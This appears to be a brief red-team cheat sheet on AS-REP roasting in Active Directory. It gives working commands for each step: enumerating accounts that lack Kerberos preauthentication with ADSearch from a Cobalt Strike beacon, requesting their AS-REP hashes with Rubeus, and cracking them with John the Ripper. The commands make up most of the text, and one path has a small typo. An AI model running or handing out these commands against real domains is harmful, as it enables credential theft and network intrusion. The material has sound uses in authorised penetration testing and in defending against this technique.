# ASREP Roasting

## Introduction

AS-REP _roasting_ is a technique that allows retrieving password hashes for users that have Do not require Kerberos preauthentication property selected.

## Enumerate Users

```sh
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
 --attributes cn,distinguishedname,samaccountname
```

## Rubeus /asreproast

```sh
beacon> execute-assembly C:\ToolsRubeus.exe asreproast /user:squid_svc /nowrap
```

## Crack Passwords

```sh
$ john --format=krb5asrep --wordlist=wordlist squid_svc
```
